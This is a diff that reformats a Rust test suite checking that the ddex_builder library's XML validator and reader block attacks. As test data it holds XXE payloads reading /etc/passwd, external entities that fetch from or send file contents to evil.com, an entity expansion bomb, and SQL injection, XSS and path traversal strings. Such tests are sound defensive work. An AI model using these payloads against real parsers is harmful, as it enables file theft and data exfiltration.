@@ -5,7 +5,7 @@
 
 use ddex_builder::{
     error::BuildError,
-    security::{InputValidator, SecurityConfig, SecureXmlReader},
+    security::{InputValidator, SecureXmlReader, SecurityConfig},
 };
 use std::io::Cursor;
 
@@ -16,7 +16,8 @@ fn test_xxe_prevention_basic() {
     let validator = InputValidator::new(config);
 
     // Test external DTD reference
-    let xxe_payload = r#"<!DOCTYPE test [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><root>&xxe;</root>"#;
+    let xxe_payload =
+        r#"<!DOCTYPE test [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><root>&xxe;</root>"#;
     let result = validator.validate_xml_content(xxe_payload);
     assert!(
         result.is_err(),
@@ -74,7 +75,8 @@ fn test_valid_xml_allowed() {
         assert!(
             result.is_ok(),
             "Valid XML should be allowed: {} -> {:?}",
-            xml, result
+            xml,
+            result
         );
     }
 }
@@ -85,7 +87,8 @@ fn test_secure_xml_reader() {
     let config = SecurityConfig::default();
 
     // Test with XXE attack
-    let xxe_xml = r#"<!DOCTYPE test [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><root>&xxe;</root>"#;
+    let xxe_xml =
+        r#"<!DOCTYPE test [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><root>&xxe;</root>"#;
     let cursor = Cursor::new(xxe_xml.as_bytes());
     let mut reader = SecureXmlReader::new(cursor, config.clone());
 
@@ -95,9 +98,9 @@ fn test_secure_xml_reader() {
     match result {
         Err(BuildError::Security(msg)) => {
             assert!(
-                msg.contains("DTD processing not allowed") 
-                || msg.contains("Dangerous entity") 
-                || msg.contains("External reference")
+                msg.contains("DTD processing not allowed")
+                    || msg.contains("Dangerous entity")
+                    || msg.contains("External reference")
             );
         }
         other => panic!("Expected security error, got: {:?}", other),
@@ -139,13 +142,10 @@ fn test_input_validation_comprehensive() {
         // XXE variations
         r#"<!DOCTYPE test [<!ENTITY xxe SYSTEM "http://evil.com/evil.xml">]><root>&xxe;</root>"#,
         r#"<!DOCTYPE test [<!ENTITY xxe SYSTEM "ftp://evil.com/steal">]><root>&xxe;</root>"#,
-        
         // Entity expansion attacks
         r#"<!DOCTYPE bomb [<!ENTITY a "aaaaaaaaaa"><!ENTITY b "&a;&a;&a;&a;&a;">]><bomb>&b;&b;&b;</bomb>"#,
-        
         // Parameter entity attacks
         r#"<!DOCTYPE test [<!ENTITY % remote SYSTEM "http://evil.com/remote.xml">%remote;]><test/>"#,
-        
         // Mixed attacks
         r#"<!DOCTYPE test [<!ENTITY % file SYSTEM "file:///etc/passwd"><!ENTITY % eval "<!ENTITY &#x25; send SYSTEM 'http://evil.com/?%file;'>">%eval;%send;]><test/>"#,
     ];
@@ -155,17 +155,19 @@ fn test_input_validation_comprehensive() {
         assert!(
             result.is_err(),
             "Attack {} should be blocked: {} -> {:?}",
-            i + 1, attack, result
+            i + 1,
+            attack,
+            result
         );
     }
 
     // Test string validation
     let malicious_strings = vec![
-        "'; DROP TABLE users; --", // SQL injection
+        "'; DROP TABLE users; --",       // SQL injection
         "<script>alert('XSS')</script>", // Script injection
-        "&malicious_entity;", // Entity reference
-        "../../../etc/passwd", // Path traversal
-        "test\0string", // Null byte
+        "&malicious_entity;",            // Entity reference
+        "../../../etc/passwd",           // Path traversal
+        "test\0string",                  // Null byte
     ];
 
     for string in malicious_strings {
@@ -174,7 +176,11 @@ fn test_input_validation_comprehensive() {
         match result {
             Ok(sanitized) => {
                 // If validation passes, ensure dangerous content is sanitized
-                assert_ne!(sanitized, string, "Dangerous content should be sanitized: {}", string);
+                assert_ne!(
+                    sanitized, string,
+                    "Dangerous content should be sanitized: {}",
+                    string
+                );
             }
             Err(_) => {
                 // Also acceptable - rejection is fine
@@ -187,9 +193,9 @@ fn test_input_validation_comprehensive() {
 #[test]
 fn test_security_limits() {
     let restrictive_config = SecurityConfig {
-        max_xml_size: 1000,     // 1KB
-        max_string_size: 100,   // 100 bytes
-        max_xml_depth: 5,       // Very shallow
+        max_xml_size: 1000,   // 1KB
+        max_string_size: 100, // 100 bytes
+        max_xml_depth: 5,     // Very shallow
         ..SecurityConfig::default()
     };
 
@@ -205,10 +211,9 @@ fn test_security_limits() {
     assert!(result.is_err(), "Large XML should be rejected");
 
     // Test depth limits with SecureXmlReader
-    let deep_xml = format!("{}content{}", 
-        (0..10)
-            .map(|i| format!("<level{}>", i))
-            .collect::<String>(),
+    let deep_xml = format!(
+        "{}content{}",
+        (0..10).map(|i| format!("<level{}>", i)).collect::<String>(),
         (0..10)
             .rev()
             .map(|i| format!("</level{}>", i))
@@ -221,7 +226,8 @@ fn test_security_limits() {
     let mut buf = Vec::new();
     let mut depth_error_found = false;
 
-    for _ in 0..50 { // Limit iterations to prevent infinite loop
+    for _ in 0..50 {
+        // Limit iterations to prevent infinite loop
         match reader.read_event(&mut buf) {
             Ok(quick_xml::events::Event::Eof) => break,
             Ok(_) => {
@@ -260,7 +266,8 @@ fn test_path_validation() {
         assert!(
             result.is_err(),
             "Dangerous path should be rejected: {} -> {:?}",
-            path, result
+            path,
+            result
         );
     }
 
@@ -277,7 +284,8 @@ fn test_path_validation() {
         assert!(
             result.is_ok(),
             "Safe path should be allowed: {} -> {:?}",
-            path, result
+            path,
+            result
         );
     }
 }
@@ -303,7 +311,8 @@ fn test_url_validation() {
         assert!(
             result.is_err(),
             "Dangerous URL should be rejected: {} -> {:?}",
-            url, result
+            url,
+            result
         );
     }
 
@@ -319,7 +328,8 @@ fn test_url_validation() {
         assert!(
             result.is_ok(),
             "Safe URL should be allowed: {} -> {:?}",
-            url, result
+            url,
+            result
         );
     }
 }
@@ -382,7 +392,10 @@ fn test_normal_operation_preserved() {
         }
     }
 
-    assert!(events_processed > 0, "Should have processed DDEX XML events");
+    assert!(
+        events_processed > 0,
+        "Should have processed DDEX XML events"
+    );
 }
 
 /// Test error messages don't leak sensitive information
@@ -392,7 +405,8 @@ fn test_secure_error_messages() {
     let validator = InputValidator::new(config);
 
     // Test XXE error message
-    let xxe_attack = r#"<!DOCTYPE test [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><root>&xxe;</root>"#;
+    let xxe_attack =
+        r#"<!DOCTYPE test [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><root>&xxe;</root>"#;
     let result = validator.validate_xml_content(xxe_attack);
 
     match result {
@@ -402,21 +416,23 @@ fn test_secure_error_messages() {
             assert!(!msg.contains("file://"));
             // Should contain generic security message
             assert!(
-                msg.to_lowercase().contains("dtd") 
-                || msg.to_lowercase().contains("entity")
-                || msg.to_lowercase().contains("external")
-                || msg.to_lowercase().contains("dangerous")
+                msg.to_lowercase().contains("dtd")
+                    || msg.to_lowercase().contains("entity")
+                    || msg.to_lowercase().contains("external")
+                    || msg.to_lowercase().contains("dangerous")
             );
         }
         other => panic!("Expected security error, got: {:?}", other),
     }
 
-    // Test path traversal error message  
+    // Test path traversal error message
     let result = validator.validate_path("../../../etc/passwd");
     match result {
         Err(BuildError::InputSanitization(msg)) => {
             assert!(!msg.contains("/etc/passwd"));
-            assert!(msg.to_lowercase().contains("path") || msg.to_lowercase().contains("traversal"));
+            assert!(
+                msg.to_lowercase().contains("path") || msg.to_lowercase().contains("traversal")
+            );
         }
         other => panic!("Expected input sanitization error, got: {:?}", other),
     }
@@ -441,7 +457,8 @@ fn test_performance_under_security_load() {
     let baseline = start.elapsed();
 
     // Measure with attack XML (should be fast rejection)
-    let attack_xml = r#"<!DOCTYPE test [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><root>&xxe;</root>"#;
+    let attack_xml =
+        r#"<!DOCTYPE test [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><root>&xxe;</root>"#;
     let start = Instant::now();
 
     for _ in 0..100 {
@@ -454,6 +471,7 @@ fn test_performance_under_security_load() {
     assert!(
         attack_duration < baseline * 5, // Allow up to 5x slower
         "Attack processing too slow: {:?} vs baseline {:?}",
-        attack_duration, baseline
+        attack_duration,
+        baseline
     );
 }
